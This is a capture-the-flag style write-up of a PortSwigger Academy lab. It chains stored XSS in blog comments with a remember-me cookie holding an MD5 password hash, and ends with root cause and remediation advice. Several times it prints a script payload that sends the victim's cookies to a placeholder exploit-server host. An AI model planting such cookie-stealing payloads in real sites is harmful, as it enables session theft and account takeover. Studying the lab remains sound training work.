# Offline Password Cracking via Stored XSS and Cookie Theft

> Platform: PortSwigger Web Security Academy  
> Lab: Offline password cracking  
> Difficulty: Practitioner  

---

# Summary

This lab demonstrates how a **stored Cross-Site Scripting (XSS)** vulnerability can be chained with insecure cookie design to achieve account compromise.

The application stores a **persistent login cookie** containing the username and an **MD5 hash of the user's password**, encoded in Base64 format.

By exploiting the stored XSS vulnerability in the blog comment functionality, it was possible to steal the victim user's **stay-logged-in cookie**, decode it, extract the password hash, crack it offline, and gain full access to the victim account.

The compromised account was then used to delete the victim user's account.

---

# Vulnerability Chain

This attack required combining two weaknesses:

1. **Stored XSS in blog comments**
2. **Weak cookie design exposing password hash**

The application stores authentication data in a predictable format:

```text
username:md5(password)
```

This value is Base64 encoded and stored in the cookie:

```text
stay-logged-in
```

Because MD5 hashes are weak and easily searchable, extracting the cookie leads directly to password recovery.

---

# Initial Investigation

## Stay Logged In Cookie Analysis

Login using the provided credentials:

```text
Username: wiener
Password: peter
```

Using Burp Suite, inspect the login response.

A cookie named:

```text
stay-logged-in
```

was observed.

The value was Base64 encoded.

---

## Cookie Decoding

After decoding in Burp Decoder, the cookie format became:

```text
wiener:md5hash
```

This revealed that the cookie structure is:

```text
username + ":" + md5(password)
```

This means any stolen cookie can expose a user's password hash.

---

# XSS Testing

Before stealing cookies, the comment functionality was tested to confirm whether XSS was possible.

## Initial Test Payload

The following payload was submitted in a blog comment:

```html
<script>alert(1)</script>
```

This confirmed that JavaScript executed successfully, proving the comment field was vulnerable to **stored XSS**.

---

# Comment Submission Requirements

The comment form required several mandatory parameters:

```text
name: test
email: test@ca
website: https://test.ca
```

Without these fields, comment submission would fail.

---

# Exploit Development

## Initial Mistakes During Payload Construction

Several mistakes occurred during payload building:

- Missing quotation marks around the exploit server URL
- Incorrect payload formatting
- Payload failed until syntax was corrected

This required repeated testing before successful execution.

---

## Final Stored XSS Payload

After correction, the payload used was:

```html
<script>document.location='//EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

This payload forces the victim browser to send its cookies to the exploit server.

---

# Attack Flow

## Step 1: Obtain Exploit Server URL

The exploit server provided a unique endpoint:

```text
EXPLOIT-SERVER-ID.exploit-server.net
```

---

## Step 2: Submit Malicious Comment

The payload was inserted into a blog comment along with required fields:

```text
Name: test
Email: test@ca
Website: https://test.ca
Comment: XSS payload(<script>document.location='//EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>)
```

---

## Step 3: Victim Visits Blog

When the victim user viewed the infected blog post, the JavaScript executed automatically.

---

## Step 4: Capture Victim Cookie

The exploit server access log received a GET request containing the victim cookie.

Captured cookie:

```text
stay-logged-in=<Base64EncodedValue>
```

---

# Cookie Decoding

The captured cookie was decoded using Burp Decoder.

Decoded result:

```text
carlos:26323c16d5f4dabff3bb136f2460a943
```

---

# Offline Password Cracking

The extracted MD5 hash:

```text
26323c16d5f4dabff3bb136f2460a943
```

was searched against public hash databases.

Recovered password:

```text
onceuponatime
```

---

# Account Compromise

Using the recovered credentials:

```text
Username: carlos
Password: onceuponatime
```

Login was successful.

---

# Final Action

After logging in as Carlos:

1. Navigate to **My account**
2. Delete the account

This solved the lab.

---

# Proof of Exploit

## XSS Payload

```html
<script>document.location='//EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

## Captured Cookie

```text
carlos:26323c16d5f4dabff3bb136f2460a943
```

## Cracked Password

```text
onceuponatime
```

---

# Impact

This vulnerability chain allows:

- Theft of persistent authentication cookies
- Extraction of password hashes
- Offline password cracking
- Full account takeover

If deployed in a real-world application, this could compromise multiple user accounts.

---

# Root Cause

The attack succeeds because of multiple security failures:

- Stored XSS in comment functionality
- Sensitive authentication data stored client-side
- Weak hash algorithm (MD5)
- No secure token-based remember-me implementation

---

# Security Lessons

Authentication cookies should never contain password-derived material.

Even if encoded, Base64 is not encryption.

MD5 is unsuitable for password-related operations.

Stored XSS becomes significantly more dangerous when combined with weak session design.

---

# Remediation

## Prevent Stored XSS

- Proper output encoding
- HTML sanitization
- Content Security Policy (CSP)

---

## Secure Remember-Me Design

Use random server-side tokens instead of password-derived cookies.

Example:

```text
random_token → mapped server-side to user session
```

---

## Replace MD5

Use secure password hashing:

- bcrypt
- Argon2
- scrypt

---

# Conclusion

This lab demonstrates how two moderate vulnerabilities become critical when chained together.

Stored XSS alone allowed cookie theft.

Weak cookie design transformed that into full password recovery and account takeover.